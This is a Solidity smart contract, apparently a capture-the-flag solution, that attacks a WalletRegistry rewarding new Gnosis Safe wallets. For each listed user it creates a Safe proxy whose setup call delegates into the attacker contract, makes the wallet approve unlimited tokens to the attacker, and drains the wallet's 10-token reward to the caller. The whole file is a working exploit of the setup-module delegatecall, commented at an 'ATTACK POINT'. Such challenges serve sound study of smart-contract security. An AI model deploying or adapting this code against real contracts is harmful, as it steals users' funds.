// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "./WalletRegistry.sol";

import "hardhat/console.sol";

/**
 * @title WalletRegistryAttacker
 * @author soyccan (soyccan@gmail.com)
 */
contract WalletRegistryAttacker {
    function attack(
        WalletRegistry walletRegistry,
        address[] memory users
    ) external {
        GnosisSafe masterCopy = GnosisSafe(
            payable(walletRegistry.masterCopy())
        );
        GnosisSafeProxyFactory walletFactory = GnosisSafeProxyFactory(
            walletRegistry.walletFactory()
        );
        IERC20 token = IERC20(walletRegistry.token());

        address[] memory owners = new address[](1);

        for (uint256 i = 0; i < users.length; ) {
            owners[0] = users[i];

            // called by GnosisSafe.setup
            // ATTACK POINT: attacker contract can register itself as a trusted
            // module and execute arbitrary code on behalf of the wallet proxy
            // here we let the proxy approve max amount to this attacker contract
            address setupModuleTo = address(this);
            bytes memory setupModuleData = abi.encodeCall(
                this.approve,
                (address(token), address(this), type(uint256).max)
            );

            // called by GnosisSafeProxyFactory.createProxyWithCallback
            bytes memory initializer = abi.encodeCall(
                masterCopy.setup,
                (
                    owners, // owners
                    1, // threshold
                    setupModuleTo,
                    setupModuleData,
                    address(0), // fallback handler
                    address(0), // payment token
                    0, // payment
                    payable(0) // payment receiver
                )
            );

            GnosisSafeProxy wallet = walletFactory.createProxyWithCallback(
                address(masterCopy), // singleton
                initializer,
                i, // saltNonce
                walletRegistry
                // callback (whose proxyCreated will be called by GnosisSafeProxyFactory)
            );

            // transfer rewards to the attacker
            token.transferFrom(address(wallet), msg.sender, 10 ether);

            unchecked {
                i++;
            }
        }
    }

    // delegate so that approve is called by the GnosisSafe proxy
    function approve(address token, address spender, uint256 amount) external {
        IERC20(token).approve(spender, amount);
    }
}
